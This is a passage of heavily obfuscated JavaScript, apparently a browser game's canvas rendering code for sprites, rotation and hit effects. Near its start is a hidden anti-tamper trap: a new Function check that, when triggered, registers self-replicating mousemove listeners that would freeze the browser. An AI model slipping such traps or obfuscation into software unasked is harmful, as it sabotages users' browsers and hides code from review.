			ᐃⵠ = ⵠⲆ[Ⲇ.ΔⲆⵠᐃΔ][ⲆⲆⲆ.time];
			ᐃⵠⵠ = -ᐃⵠ.width;
			ⵠⵠᐃ = -ᐃⵠ.height;
			ΔⲆΔⵠ(Δ, ᐃⵠ, -ᐃⵠⵠ / 2, -ⵠⵠᐃ / 2, ᐃⵠⵠ, ⵠⵠᐃ);
			Δ.restore()
		}
		var ΔⵠΔⵠⲆⵠΔ = 0;
		const ⲆΔΔᐃⲆⲆⲆⵠΔ = 7112952;
		const ᐃᐃΔⲆᐃⲆⵠⲆⲆ = ⲆΔΔᐃⲆⲆⲆⵠΔ["ⲆᐃⲆⲆΔⵠΔ"];
		const ⵠⵠΔⲆⵠⲆⵠΔⲆ = `const ⲆⵠΔⵠΔᐃΔᐃΔ = (typeof ΔᐃⵠⲆᐃᐃᐃⲆΔ === "${ᐃᐃΔⲆᐃⲆⵠⲆⲆ}") ? 1 : 0; return ⲆⵠΔⵠΔᐃΔᐃΔ;`;

		function ΔᐃⵠⲆᐃᐃᐃⲆΔ() {
			ᐃᐃΔⲆᐃⲆⵠⲆⲆ;
			ⲆΔΔᐃⲆⲆⲆⵠΔ();
			return ⵠⵠΔⲆⵠⲆⵠΔⲆ
		}
		const ⲆⵠΔⵠΔᐃΔᐃΔ = 16108445;
		const ΔⵠΔᐃⲆⲆⵠⲆⲆ = new Function(ΔᐃⵠⲆᐃᐃᐃⲆΔ + ⵠⵠΔⲆⵠⲆⵠΔⲆ);
		const ᐃᐃⵠⲆᐃⲆᐃ = 2105049;
		if (ΔⵠΔᐃⲆⲆⵠⲆⲆ(ⲆⵠΔⵠΔᐃΔᐃΔ, ᐃᐃⵠⲆᐃⲆᐃ) === 1) {
			const ⲆΔΔᐃⲆⲆⲆⵠΔ = function() {
				ᐃⲆᐃΔᐃⵠᐃ[ΔᐃⲆⵠⲆⵠΔ[277]]("mousemove", (function() {
					ⲆΔΔᐃⲆⲆⲆⵠΔ()
				}))
			};
			ⲆΔΔᐃⲆⲆⲆⵠΔ()
		}

		function ΔΔⵠⲆᐃᐃⲆⲆⵠ() {
			if (this.info === 10) return;
			var ⲆΔⲆⲆ = this.info & 15;
			for (var ⵠᐃ = 0; ⵠᐃ < ⲆΔⲆⲆ; ⵠᐃ++) this.ᐃΔᐃⵠ[ⵠᐃ].ΔᐃΔⵠ(Ⲇ.ᐃⲆⲆᐃⵠ, this.x, this.y);
			Δ.save();
			Δ.translate(ᐃᐃΔ.ⲆΔΔ.x + this.x, ᐃᐃΔ.ⲆΔΔ.y + this.y);
			Δ.rotate(this.angle);
			if (this.Δᐃⵠ.ⵠⲆᐃ) {
				this.Δᐃⵠ.ᐃᐃⵠΔ.ⵠⲆᐃ() && this.Δᐃⵠ.ᐃᐃⵠΔ.ᐃⲆΔ == ⲆΔᐃⲆΔ && (this.Δᐃⵠ.ⵠⲆᐃ = false);
				var ΔᐃΔ = 600 * ((1 - this.Δᐃⵠ.ᐃᐃⵠΔ.ΔᐃΔ) * ᐃⵠᐃᐃ) * ᐃ;
				var Δⵠ = ΔᐃΔ * Math.sin(this.Δᐃⵠ.angle - this.angle);
				var ⲆⵠⲆ = ΔᐃΔ * Math.cos(this.Δᐃⵠ.angle - this.angle)
			} else {
				var Δⵠ = 0;
				var ⲆⵠⲆ = 0
			}
			if (this.info & 16) var ᐃⵠ = ⵠⲆ[Ⲇ.ᐃᐃΔⲆⲆᐃⵠ][ⲆⲆⲆ.time];
			else var ᐃⵠ = ⵠⲆ[Ⲇ.ⵠⵠⵠⵠⵠᐃΔ][ⲆⲆⲆ.time];
			ΔⲆΔⵠ(Δ, ᐃⵠ, -ᐃⵠ.width / ΔⲆΔΔΔ + Δⵠ, -ᐃⵠ.width / ⵠⵠΔⲆ + ⲆⵠⲆ);
			Δ.restore()
		}

		function ⲆᐃⲆᐃᐃⵠᐃΔΔ() {
			Δ.save();
			Δ.translate(ᐃᐃΔ.ⲆΔΔ.x + this.x, ᐃᐃΔ.ⲆΔΔ.y + this.y);
			Δ.rotate(this.angle);
			this.ΔⲆΔⲆⵠ.ⵠⲆᐃ();
			ᐃⵠ = ⵠⲆ[Ⲇ.ΔⲆⵠᐃᐃΔⵠ][ⲆⲆⲆ.time];
			ᐃⵠⵠ = -ᐃⵠ.width * this.ΔⲆΔⲆⵠ.ΔᐃΔ;
			ⵠⵠᐃ = -ᐃⵠ.height * this.ΔⲆΔⲆⵠ.ΔᐃΔ;
			ΔⲆΔⵠ(Δ, ᐃⵠ, -ᐃⵠⵠ / 2, -ⵠⵠᐃ / 2, ᐃⵠⵠ, ⵠⵠᐃ);
			Δ.restore()
		}

		function ⲆᐃⲆᐃΔᐃᐃⵠΔ(ⵠΔᐃᐃ, Δⵠ, ⲆⵠⲆ) {
			if (ⵠΔᐃᐃ >= ⵠΔⲆⵠ) {
				ᐃⵠ = ⵠⲆ[ⵠΔᐃᐃ][ⲆⲆⲆ.time];
				switch (ⵠΔᐃᐃ) {
					case Ⲇ.ⵠⲆⲆⲆΔ:
					case Ⲇ.ΔᐃⵠΔⲆ:
					case Ⲇ.ⲆΔⲆⵠⵠ:
						ⲆΔΔⵠΔ(ⵠΔᐃᐃ, ᐃⵠ, -ᐃⵠ.width / 4 - ᐃ * (ⲆⲆⲆᐃ + Δⵠ), -ᐃⵠ.height / 4 + ᐃ * (ⲆⵠⲆ + 35));
						break;
					case Ⲇ.ⲆᐃⵠᐃⲆ:
						ⲆΔΔⵠΔ(ⵠΔᐃᐃ, ᐃⵠ, -ᐃⵠ.width / ᐃⵠⵠΔ - ᐃ * (1 + Δⵠ), -ᐃⵠ.height / 4 + ᐃ * (ⲆⵠⲆ + 45));
						break;
					case Ⲇ.ⲆⵠⵠΔᐃ:
					case Ⲇ.ᐃᐃᐃⵠΔ:
						ⲆΔΔⵠΔ(ⵠΔᐃᐃ, ᐃⵠ, -ᐃⵠ.width / 4 - ᐃ * (ⵠΔⲆ + Δⵠ), -ᐃⵠ.height / ⲆⵠᐃΔ + (ⲆⵠⲆ + 40) * ᐃ);
						break
				}
			}
		}

		function ⲆⵠⵠΔⵠⲆⵠ(ᐃΔ) {
			Δ.save();
			Δ.translate(ᐃᐃΔ.ⲆΔΔ.x + this.x, ᐃᐃΔ.ⲆΔΔ.y + this.y);
			Δ.rotate(this.angle);
			this.ᐃΔⲆⲆ.ⵠⲆᐃ();
			ᐃⵠ = ⵠⲆ[ᐃΔ][ⲆⲆⲆ.time];
			ᐃⵠⵠ = -ᐃⵠ.width * this.ᐃΔⲆⲆ.ΔᐃΔ;
			ⵠⵠᐃ = -ᐃⵠ.height * this.ᐃΔⲆⲆ.ΔᐃΔ;
			ΔⲆΔⵠ(Δ, ᐃⵠ, -ᐃⵠⵠ / ⵠΔⲆᐃ, -ⵠⵠᐃ / ΔⵠⵠΔ, ᐃⵠⵠ, ⵠⵠᐃ);
			Δ.restore()
		}

		function ⵠᐃⲆⲆᐃⵠⲆᐃⲆ() {
			Δ.save();
			Δ.translate(ᐃᐃΔ.ⲆΔΔ.x + this.x, ᐃᐃΔ.ⲆΔΔ.y + this.y);
			if (this.Δᐃⵠ.ⵠⲆᐃ) {
				if (this.Δᐃⵠ.ᐃᐃⵠΔ.ⵠⲆᐃ() && false == this.Δᐃⵠ.ᐃᐃⵠΔ.ᐃⲆΔ) this.Δᐃⵠ.ⵠⲆᐃ = false;
				var ΔᐃΔ = ᐃ * (600 * ((1 - this.Δᐃⵠ.ᐃᐃⵠΔ.ΔᐃΔ) * ᐃⵠᐃᐃ));
				var Δⵠ = ΔᐃΔ * Math.sin(this.Δᐃⵠ.angle - this.angle);
				var ⲆⵠⲆ = Math.cos(this.Δᐃⵠ.angle - this.angle) * ΔᐃΔ
			} else {
				var Δⵠ = ᐃΔΔ;
				var ⲆⵠⲆ = ᐃΔΔ
			}
			var ⲆΔⲆⲆ = this.info & 15;
			if (this.info === ᐃⵠᐃΔⵠ || ⲆΔⲆⲆ === 0) {
				Δ.rotate(this.angle);
				this.ⵠⲆⲆⵠ.ⵠⲆᐃ();
				if (this.info & 16) var ᐃⵠ = ⵠⲆ[Ⲇ.ΔⵠᐃᐃⲆⵠⵠ][ⲆⲆⲆ.time];
				else var ᐃⵠ = ⵠⲆ[Ⲇ.ᐃΔⵠⵠΔⲆⲆ][ⲆⲆⲆ.time];
				var ᐃⵠⵠ = -ᐃⵠ.width * this.ⵠⲆⲆⵠ.ΔᐃΔ;
				var ⵠⵠᐃ = this.ⵠⲆⲆⵠ.ΔᐃΔ * -ᐃⵠ.height;
				ΔⲆΔⵠ(Δ, ᐃⵠ, -ᐃⵠⵠ / 2 + Δⵠ, -ⵠⵠᐃ / 2 + ⲆⵠⲆ, ᐃⵠⵠ, ⵠⵠᐃ)
			} else {
				if (this.info & 16) var ᐃⵠ = ⵠⲆ[Ⲇ.ΔΔⲆΔⲆΔⲆ][ⲆⲆⲆ.time];
				else var ᐃⵠ = ⵠⲆ[Ⲇ.ⲆⲆⵠΔΔ][ⲆⲆⲆ.time];
				Δ.translate(0, ᐃⵠ.height / Δᐃⵠⵠ);
				ΔⲆΔⵠ(Δ, ᐃⵠ, Δⵠ - ᐃⵠ.width / 2, -ᐃⵠ.height + ⲆⵠⲆ)
			}
			Δ.restore()
		}

		function ⵠᐃⵠᐃΔΔⲆᐃΔ() {
			Δ.save();
			Δ.translate(ᐃᐃΔ.ⲆΔΔ.x + this.x, ᐃᐃΔ.ⲆΔΔ.y + this.y);
			Δ.rotate(this.angle);
			this.ΔⲆΔⲆⵠ.ⵠⲆᐃ();
			ᐃⵠ = ⵠⲆ[Ⲇ.ⵠⲆΔⲆΔⵠⵠ][ⲆⲆⲆ.time];
			ᐃⵠⵠ = -ᐃⵠ.width * this.ΔⲆΔⲆⵠ.ΔᐃΔ;
			ⵠⵠᐃ = this.ΔⲆΔⲆⵠ.ΔᐃΔ * -ᐃⵠ.height;
			ΔⲆΔⵠ(Δ, ᐃⵠ, -ᐃⵠⵠ / 2, -ⵠⵠᐃ / 2, ᐃⵠⵠ, ⵠⵠᐃ);
			Δ.restore()
		}

		function ⲆΔⵠⲆᐃΔⲆⵠⵠ() {
			Δ.save();
			Δ.translate(ᐃᐃΔ.ⲆΔΔ.x + this.x, ᐃᐃΔ.ⲆΔΔ.y + this.y);
			if (this.Δᐃⵠ.ⵠⲆᐃ) {
				if (this.Δᐃⵠ.ᐃᐃⵠΔ.ⵠⲆᐃ() && false == this.Δᐃⵠ.ᐃᐃⵠΔ.ᐃⲆΔ) this.Δᐃⵠ.ⵠⲆᐃ = false;
				var ΔᐃΔ = 600 * (ᐃⵠᐃᐃ * (ⵠΔΔ - this.Δᐃⵠ.ᐃᐃⵠΔ.ΔᐃΔ)) * ᐃ;
				var Δⵠ = ΔᐃΔ * Math.sin(this.Δᐃⵠ.angle - this.angle);
				var ⲆⵠⲆ = Math.cos(this.Δᐃⵠ.angle - this.angle) * ΔᐃΔ
			} else {
				var Δⵠ = ᐃΔΔ;
				var ⲆⵠⲆ = 0
			}
			var ⲆΔⲆⲆ = this.info & 15;
			if (ⲆⵠΔΔᐃ === this.info || ᐃⵠΔ === ⲆΔⲆⲆ) {
				Δ.rotate(this.angle);
				this.ⵠⲆⲆⵠ.ⵠⲆᐃ();
				if (this.info & 16) var ᐃⵠ = ⵠⲆ[Ⲇ.ⲆⵠⵠᐃⵠΔᐃ][ⲆⲆⲆ.time];
				else var ᐃⵠ = ⵠⲆ[Ⲇ.ⲆᐃΔⵠⵠⵠᐃ][ⲆⲆⲆ.time];
				var ᐃⵠⵠ = this.ⵠⲆⲆⵠ.ΔᐃΔ * -ᐃⵠ.width;
				var ⵠⵠᐃ = -ᐃⵠ.height * this.ⵠⲆⲆⵠ.ΔᐃΔ;
				ΔⲆΔⵠ(Δ, ᐃⵠ, -ᐃⵠⵠ / 2 + Δⵠ, -ⵠⵠᐃ / ⲆΔΔⵠ + ⲆⵠⲆ, ᐃⵠⵠ, ⵠⵠᐃ)
			} else {
				if (this.info & 16) var ᐃⵠ = ⵠⲆ[Ⲇ.ⲆΔΔⵠΔᐃᐃ][ⲆⲆⲆ.time];
				else var ᐃⵠ = ⵠⲆ[Ⲇ.ⵠⲆΔⲆΔ][ⲆⲆⲆ.time];
				Δ.translate(ᐃΔΔ, ᐃⵠ.height / 2);
				ΔⲆΔⵠ(Δ, ᐃⵠ, Δⵠ - ᐃⵠ.width / 2, -ᐃⵠ.height + ⲆⵠⲆ)
			}
			Δ.restore()
		}

		function ⲆΔΔΔᐃΔᐃⲆⲆ() {
			this.ᐃΔⲆⲆ.ⵠⲆᐃ();
			Δ.save();
			Δ.translate(ᐃᐃΔ.ⲆΔΔ.x + this.x, ᐃᐃΔ.ⲆΔΔ.y + this.y);
			Δ.rotate(this.angle);
			this.info === 0 ? ᐃⵠ = ⵠⲆ[Ⲇ.ⲆⵠᐃⵠⲆ][ⲆⲆⲆ.time] : ᐃⵠ = ⵠⲆ[Ⲇ.ⵠⲆᐃⵠΔⲆΔ][ⲆⲆⲆ.time];
			ᐃⵠⵠ = -ᐃⵠ.width * this.ᐃΔⲆⲆ.ΔᐃΔ;
			ⵠⵠᐃ = this.ᐃΔⲆⲆ.ΔᐃΔ * -ᐃⵠ.height;
			ΔⲆΔⵠ(Δ, ᐃⵠ, -ᐃⵠⵠ / 2, -ⵠⵠᐃ / 2, ᐃⵠⵠ, ⵠⵠᐃ);
			if (this.action & ⵠⵠⵠⲆ.ⵠΔΔΔ) {
				if (this.Δᐃⵠ.ⵠⲆᐃ() && this.Δᐃⵠ.ᐃⲆΔ == ⲆᐃⵠⲆⵠ) this.action -= ⵠⵠⵠⲆ.ⵠΔΔΔ;
				Δ.globalAlpha = .6 - this.Δᐃⵠ.ΔᐃΔ;
				var ᐃⵠ = ⵠⲆ[Ⲇ.ᐃΔΔΔΔⵠⵠ];
				ΔⲆΔⵠ(Δ, ᐃⵠ, -ᐃⵠⵠ / 2, -ⵠⵠᐃ / 2, ᐃⵠⵠ, ⵠⵠᐃ);
				Δ.globalAlpha = 1
			}
			Δ.restore()
		}

		function ᐃᐃⵠⵠⵠⲆⵠⲆⵠ() {
			if (10 > this.info) return;
			Δ.save();
			Δ.translate(ᐃᐃΔ.ⲆΔΔ.x + this.x, ᐃᐃΔ.ⲆΔΔ.y + this.y);
			Δ.rotate(this.angle);
			if (this.Δᐃⵠ.ⵠⲆᐃ) {
				if (this.Δᐃⵠ.ᐃᐃⵠΔ.ⵠⲆᐃ() && ⲆⵠΔⵠΔ == this.Δᐃⵠ.ᐃᐃⵠΔ.ᐃⲆΔ) this.Δᐃⵠ.ⵠⲆᐃ = false;
				var ΔᐃΔ = ᐃ * (ᐃⵠᐃᐃ * (ⵠⲆΔ - this.Δᐃⵠ.ᐃᐃⵠΔ.ΔᐃΔ) * 600);
				var Δⵠ = ΔᐃΔ * Math.sin(this.Δᐃⵠ.angle - this.angle);
				var ⲆⵠⲆ = ΔᐃΔ * Math.cos(this.Δᐃⵠ.angle - this.angle)
			} else {
				var Δⵠ = ᐃⵠⲆⵠ;
				var ⲆⵠⲆ = 0
			}
			this.ⵠⲆⲆⵠ.ⵠⲆᐃ();
			var ᐃⵠ = ⵠⲆ[Ⲇ.ᐃΔΔⲆᐃᐃΔ][ⲆⲆⲆ.time];
			var ᐃⵠⵠ = -ᐃⵠ.width * this.ⵠⲆⲆⵠ.ΔᐃΔ;
			var ⵠⵠᐃ = this.ⵠⲆⲆⵠ.ΔᐃΔ * -ᐃⵠ.height;
			ΔⲆΔⵠ(Δ, ᐃⵠ, -ᐃⵠⵠ / ⵠⲆⵠⲆ + Δⵠ, -ⵠⵠᐃ / ⲆᐃᐃⲆ + ⲆⵠⲆ, ᐃⵠⵠ, ⵠⵠᐃ);
			Δ.restore()
		}

		function ⵠΔⵠΔΔⲆⲆⵠΔ() {
			Δ.save();
			Δ.translate(ᐃᐃΔ.ⲆΔΔ.x + this.x, ᐃᐃΔ.ⲆΔΔ.y + this.y);
			Δ.rotate(this.angle);
			300 < ΔΔⲆᐃ.ᐃⵠⵠᐃ(this, this.r) ? this.scale = Math.min(this.scale + ᐃⵠᐃᐃ / 2, 1.8) : this.scale = Math.max(this.scale - ᐃⵠᐃᐃ, 1);
			this.ᐃΔⲆⲆ.ⵠⲆᐃ();
			this.rotate.ⵠⲆᐃ();
			0 === this.info ? ᐃⵠ = ⵠⲆ[Ⲇ.ΔⵠⵠΔⲆ][ⲆⲆⲆ.time] : ᐃⵠ = ⵠⲆ[Ⲇ.ΔΔΔᐃᐃⵠⲆ][ⲆⲆⲆ.time];
			ᐃⵠⵠ = this.ᐃΔⲆⲆ.ΔᐃΔ * -ᐃⵠ.width * this.scale;
			ⵠⵠᐃ = this.ᐃΔⲆⲆ.ΔᐃΔ * -ᐃⵠ.height * this.scale;
			ΔⲆΔⵠ(Δ, ᐃⵠ, -ᐃⵠⵠ / ⵠΔΔᐃΔ, -ⵠⵠᐃ / Ⲇⵠⵠⵠ, ᐃⵠⵠ / ⲆΔΔⵠ, ⵠⵠᐃ / ΔⵠⵠΔ);
			if (this.action & ⵠⵠⵠⲆ.ⵠΔΔΔ) {
				if (this.Δᐃⵠ.ⵠⲆᐃ() && this.Δᐃⵠ.ᐃⲆΔ == ⲆⵠΔⵠΔ) this.action -= ⵠⵠⵠⲆ.ⵠΔΔΔ;
				Δ.globalAlpha = .6 - this.Δᐃⵠ.ΔᐃΔ;
				var ᐃⵠ = ⵠⲆ[Ⲇ.ⵠⵠΔⵠΔΔᐃ];
				ΔⲆΔⵠ(Δ, ᐃⵠ, -ᐃⵠⵠ / 4, -ⵠⵠᐃ / 4, ᐃⵠⵠ / 2, ⵠⵠᐃ / ⲆⲆΔᐃ);
				Δ.globalAlpha = 1
			}
			this.info === 0 ? ᐃⵠ = ⵠⲆ[Ⲇ.ΔᐃⲆⲆᐃΔⲆ][ⲆⲆⲆ.time] : ᐃⵠ = ⵠⲆ[Ⲇ.ᐃᐃⲆᐃΔΔΔ][ⲆⲆⲆ.time];
			ᐃⵠⵠ = this.ᐃΔⲆⲆ.ΔᐃΔ * -ᐃⵠ.width * this.scale;
			ⵠⵠᐃ = this.ᐃΔⲆⲆ.ΔᐃΔ * -ᐃⵠ.height * this.scale;
			Δ.save();
			Δ.translate(ᐃ * -40, ᐃ * 10);
			Δ.rotate(this.rotate.ΔᐃΔ);
			ΔⲆΔⵠ(Δ, ᐃⵠ, ᐃ * -ᐃⵠⵠ / 4, ᐃ * -ⵠⵠᐃ / ΔΔⵠⵠΔ, ᐃⵠⵠ / ⲆⲆΔᐃ, ⵠⵠᐃ / ⵠⵠⵠΔ);
			if (this.action & ⵠⵠⵠⲆ.ⵠΔΔΔ) {
				Δ.globalAlpha = .6 - this.Δᐃⵠ.ΔᐃΔ;
				var ᐃⵠ = ⵠⲆ[Ⲇ.ⵠᐃⲆΔΔΔⵠ];
				ΔⲆΔⵠ(Δ, ᐃⵠ, -ᐃⵠⵠ * ᐃ / ⲆΔⵠᐃ, -ⵠⵠᐃ * ᐃ / ⲆᐃᐃΔ, ᐃⵠⵠ / 2, ⵠⵠᐃ / 2);
				Δ.globalAlpha = 1
			}
			Δ.restore();
			if (ⵠⲆⲆ === this.info) ᐃⵠ = ⵠⲆ[Ⲇ.ΔⵠⵠⵠᐃᐃΔ][ⲆⲆⲆ.time];
			else ᐃⵠ = ⵠⲆ[Ⲇ.ΔᐃΔΔⵠΔⵠ][ⲆⲆⲆ.time];
			Δ.save();
			Δ.translate(40 * ᐃ, ⵠⵠΔⲆᐃ * ᐃ);
			Δ.rotate(-this.rotate.ΔᐃΔ);
			ΔⲆΔⵠ(Δ, ᐃⵠ, -ᐃⵠⵠ * ᐃ / 4, -ⵠⵠᐃ * ᐃ / 4, ᐃⵠⵠ / ⵠΔⲆᐃ, ⵠⵠᐃ / 2);
			if (this.action & ⵠⵠⵠⲆ.ⵠΔΔΔ) {
				Δ.globalAlpha = .6 - this.Δᐃⵠ.ΔᐃΔ;
				var ᐃⵠ = ⵠⲆ[Ⲇ.ⵠⲆᐃⵠⵠΔᐃ];
				ΔⲆΔⵠ(Δ, ᐃⵠ, -ᐃⵠⵠ * ᐃ / 4, ᐃ * -ⵠⵠᐃ / 4, ᐃⵠⵠ / 2, ⵠⵠᐃ / 2);
				Δ.globalAlpha = 1
			}
			Δ.restore();
			Δ.restore()
		}

		function ᐃᐃⵠΔⲆᐃⲆΔⵠ() {
			if (this.Δᐃⵠ.ⵠⲆᐃ) {
				if (this.Δᐃⵠ.ᐃᐃⵠΔ.ⵠⲆᐃ() && false == this.Δᐃⵠ.ᐃᐃⵠΔ.ᐃⲆΔ) this.Δᐃⵠ.ⵠⲆᐃ = false;
				var ΔᐃΔ = 600 * (ᐃⵠᐃᐃ * (1 - this.Δᐃⵠ.ᐃᐃⵠΔ.ΔᐃΔ)) * ᐃ;
				var Δⵠ = Math.sin(this.Δᐃⵠ.angle - this.angle) * ΔᐃΔ;
				var ⲆⵠⲆ = Math.cos(this.Δᐃⵠ.angle - this.angle) * ΔᐃΔ
			} else {
				var Δⵠ = ⲆΔⵠ;
				var ⲆⵠⲆ = ΔᐃΔΔ
			}
			Δ.save();
			if (this.info & 255 && (this.info & 65280) != 65280) {
				Δⵠ += Math.random() * 2 - ⵠΔᐃ;
				ⲆⵠⲆ += 2 * Math.random() - ⵠᐃⵠΔ
			}
			Δ.translate(ᐃᐃΔ.ⲆΔΔ.x + this.x + Δⵠ, ᐃᐃΔ.ⲆΔΔ.y + this.y + ⲆⵠⲆ);
			Δ.rotate(this.angle);
			ᐃⵠ = ⵠⲆ[Ⲇ.ᐃⵠᐃⲆⵠ][ⲆⲆⲆ.time];
			ΔⲆΔⵠ(Δ, ᐃⵠ, -ᐃⵠ.width / 2, -ᐃⵠ.height / ᐃⲆⵠᐃΔ);
			this.info & 255 && 65280 != (this.info & 65280) && (this.rotate = (this.rotate + 3 * ᐃⵠᐃᐃ) % (2 * Math.PI));
			Δ.rotate(this.rotate);
			ᐃⵠ = ⵠⲆ[Ⲇ.ΔⵠⲆⵠⲆⵠᐃ][ⲆⲆⲆ.time];
			ΔⲆΔⵠ(Δ, ᐃⵠ, -ᐃⵠ.width / ΔⵠⵠΔ, -ᐃⵠ.height / 2);
			Δ.restore()
		}

		function ΔⲆᐃⵠⵠΔΔᐃⵠ() {
			if (this.Δᐃⵠ.ⵠⲆᐃ) {
				if (this.Δᐃⵠ.ᐃᐃⵠΔ.ⵠⲆᐃ() && ΔΔⵠⲆΔ == this.Δᐃⵠ.ᐃᐃⵠΔ.ᐃⲆΔ) this.Δᐃⵠ.ⵠⲆᐃ = ⲆΔᐃⲆΔ;
				var ΔᐃΔ = 600 * (ᐃⵠᐃᐃ * (ⵠΔⲆ - this.Δᐃⵠ.ᐃᐃⵠΔ.ΔᐃΔ)) * ᐃ;
				var Δⵠ = ΔᐃΔ * Math.sin(this.Δᐃⵠ.angle - this.angle);
				var ⲆⵠⲆ = Math.cos(this.Δᐃⵠ.angle - this.angle) * ΔᐃΔ
			} else {
				var Δⵠ = ⵠᐃⲆᐃ;
				var ⲆⵠⲆ = ΔΔⵠ
			}
			Δ.save();
			if (this.info & 255 && 65280 != (this.info & 65280)) {
				Δⵠ += 2 * Math.random() - ᐃⲆᐃ;
				ⲆⵠⲆ += Math.random() * 2 - ΔⲆⵠ
			}
			Δ.translate(ᐃᐃΔ.ⲆΔΔ.x + this.x + Δⵠ, ᐃᐃΔ.ⲆΔΔ.y + this.y + ⲆⵠⲆ);
			Δ.rotate(this.angle);
			ᐃⵠ = ⵠⲆ[Ⲇ.ⲆΔΔΔᐃ][ⲆⲆⲆ.time];
			ΔⲆΔⵠ(Δ, ᐃⵠ, -ᐃⵠ.width / 2, -ᐃⵠ.height / 2);
			this.info & 255 && 65280 != (this.info & 65280) && (this.rotate = (this.rotate + ⵠⵠⵠᐃ * ᐃⵠᐃᐃ) % (Math.PI * 2));
			Δ.rotate(this.rotate);
			ᐃⵠ = ⵠⲆ[Ⲇ.ᐃⵠᐃᐃⲆⲆⵠ][ⲆⲆⲆ.time];
			ΔⲆΔⵠ(Δ, ᐃⵠ, -ᐃⵠ.width / Δᐃⵠⵠ, -ᐃⵠ.height / 2);
			Δ.restore()
		}

		function ΔⵠΔΔΔⵠⵠᐃⲆ() {
			Δ.save();
			Δ.translate(ᐃᐃΔ.ⲆΔΔ.x + this.x, ᐃᐃΔ.ⲆΔΔ.y + this.y);
			Δ.rotate(this.angle);
			if (ΔΔⲆᐃ.ᐃⵠⵠᐃ(this, this.r) > 300) this.scale = Math.min(this.scale + ᐃⵠᐃᐃ / ⵠⲆⵠⲆ, 1.8);
			else this.scale = Math.max(this.scale - ᐃⵠᐃᐃ, 1);
			this.ᐃΔⲆⲆ.ⵠⲆᐃ();
			this.rotate.ⵠⲆᐃ();
			if (this.info === ΔΔⵠ) ᐃⵠ = ⵠⲆ[Ⲇ.ⵠⲆᐃⲆᐃ][ⲆⲆⲆ.time];
			else ᐃⵠ = ⵠⲆ[Ⲇ.ᐃⲆᐃⵠΔᐃⲆ][ⲆⲆⲆ.time];
			ᐃⵠⵠ = -ᐃⵠ.width * this.ᐃΔⲆⲆ.ΔᐃΔ * this.scale;
			ⵠⵠᐃ = -ᐃⵠ.height * this.ᐃΔⲆⲆ.ΔᐃΔ * this.scale;
			ΔⲆΔⵠ(Δ, ᐃⵠ, -ᐃⵠⵠ / 4, -ⵠⵠᐃ / 4, ᐃⵠⵠ / ΔⵠⵠΔ, ⵠⵠᐃ / 2);
			if (this.action & ⵠⵠⵠⲆ.ⵠΔΔΔ) {
				if (this.Δᐃⵠ.ⵠⲆᐃ() && ΔᐃⵠᐃⲆ == this.Δᐃⵠ.ᐃⲆΔ) this.action -= ⵠⵠⵠⲆ.ⵠΔΔΔ;
				Δ.globalAlpha = .6 - this.Δᐃⵠ.ΔᐃΔ;
				var ᐃⵠ = ⵠⲆ[Ⲇ.ⲆᐃⲆⲆⲆᐃΔ];
				ΔⲆΔⵠ(Δ, ᐃⵠ, -ᐃⵠⵠ / ⲆⵠΔⵠ, -ⵠⵠᐃ / 4, ᐃⵠⵠ / 2, ⵠⵠᐃ / 2);
				Δ.globalAlpha = ΔᐃᐃⲆ
			}
			0 === this.info ? ᐃⵠ = ⵠⲆ[Ⲇ.ΔΔⵠⲆᐃΔⵠ][ⲆⲆⲆ.time] : ᐃⵠ = ⵠⲆ[Ⲇ.ΔⵠⵠⲆⵠᐃⲆ][ⲆⲆⲆ.time];
			ᐃⵠⵠ = -ᐃⵠ.width * this.ᐃΔⲆⲆ.ΔᐃΔ * this.scale;
			ⵠⵠᐃ = this.scale * (-ᐃⵠ.height * this.ᐃΔⲆⲆ.ΔᐃΔ);
			Δ.save();
			Δ.translate(ᐃ * -40, ᐃ * 10);
			Δ.rotate(this.rotate.ΔᐃΔ);
			ΔⲆΔⵠ(Δ, ᐃⵠ, ᐃ * -ᐃⵠⵠ / ᐃⲆᐃⲆⵠ, -ⵠⵠᐃ * ᐃ / 4, ᐃⵠⵠ / 2, ⵠⵠᐃ / ᐃⵠⲆⲆⲆ);
			if (this.action & ⵠⵠⵠⲆ.ⵠΔΔΔ) {
				Δ.globalAlpha = .6 - this.Δᐃⵠ.ΔᐃΔ;
				var ᐃⵠ = ⵠⲆ[Ⲇ.ΔⲆⲆⵠᐃⵠᐃ];
				ΔⲆΔⵠ(Δ, ᐃⵠ, ᐃ * -ᐃⵠⵠ / 4, -ⵠⵠᐃ * ᐃ / 4, ᐃⵠⵠ / ΔⵠᐃⲆ, ⵠⵠᐃ / 2);
				Δ.globalAlpha = 1
			}
			Δ.restore();
			if (0 === this.info) ᐃⵠ = ⵠⲆ[Ⲇ.ᐃᐃΔΔⵠᐃᐃ][ⲆⲆⲆ.time];
			else ᐃⵠ = ⵠⲆ[Ⲇ.ΔΔΔⵠⲆᐃᐃ][ⲆⲆⲆ.time];
			Δ.save();
			Δ.translate(40 * ᐃ, 10 * ᐃ);
			Δ.rotate(-this.rotate.ΔᐃΔ);
			ΔⲆΔⵠ(Δ, ᐃⵠ, -ᐃⵠⵠ * ᐃ / ⲆΔⵠᐃ, -ⵠⵠᐃ * ᐃ / 4, ᐃⵠⵠ / ᐃⲆⵠᐃ, ⵠⵠᐃ / ⵠⵠΔⲆ);
			if (this.action & ⵠⵠⵠⲆ.ⵠΔΔΔ) {
				Δ.globalAlpha = .6 - this.Δᐃⵠ.ΔᐃΔ;
				var ᐃⵠ = ⵠⲆ[Ⲇ.ᐃⵠⲆᐃⲆΔⲆ];
				ΔⲆΔⵠ(Δ, ᐃⵠ, ᐃ * -ᐃⵠⵠ / ΔⲆⲆⲆ, -ⵠⵠᐃ * ᐃ / 4, ᐃⵠⵠ / 2, ⵠⵠᐃ / 2);
				Δ.globalAlpha = ⵠΔⵠΔ
			}
			Δ.restore();
			Δ.restore()
		}

		function ΔᐃⲆⵠⲆᐃⲆᐃᐃ() {
			Δ.save();
			Δ.translate(ᐃᐃΔ.ⲆΔΔ.x + this.x, ᐃᐃΔ.ⲆΔΔ.y + this.y);
			Δ.rotate(this.angle);
			if (this.Δᐃⵠ.ⵠⲆᐃ) {
				if (this.Δᐃⵠ.ᐃᐃⵠΔ.ⵠⲆᐃ() && this.Δᐃⵠ.ᐃᐃⵠΔ.ᐃⲆΔ == ⲆᐃⵠⲆⵠ) this.Δᐃⵠ.ⵠⲆᐃ = ⵠΔⲆⲆⲆ;
				var ΔᐃΔ = ᐃ * ((1 - this.Δᐃⵠ.ᐃᐃⵠΔ.ΔᐃΔ) * ᐃⵠᐃᐃ * 600);
				var Δⵠ = Math.sin(this.Δᐃⵠ.angle - this.angle) * ΔᐃΔ;
